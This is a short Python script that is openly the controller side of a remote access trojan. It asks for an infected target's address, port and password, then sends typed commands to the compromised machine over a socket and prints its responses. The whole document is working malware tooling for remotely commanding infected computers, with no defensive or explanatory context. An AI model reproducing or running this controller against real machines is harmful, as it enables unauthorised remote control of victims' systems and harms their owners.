import socket
from threading import Thread
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = input('[*] Infected target address >> ')
port = int(input('[*] Rat port >> '))
s.connect((ip, port))
s.send(input('[*] Rat password >> ').encode())


def listen_for_server():
    while True:
        try:
            print(s.recv(1048576).decode())
        except:
            print('Error receiving message from server')


Thread(target=listen_for_server, daemon=True).start()
while True:
    s.send(input(f'rat@{ip}: ').encode())
    time.sleep(0.1)
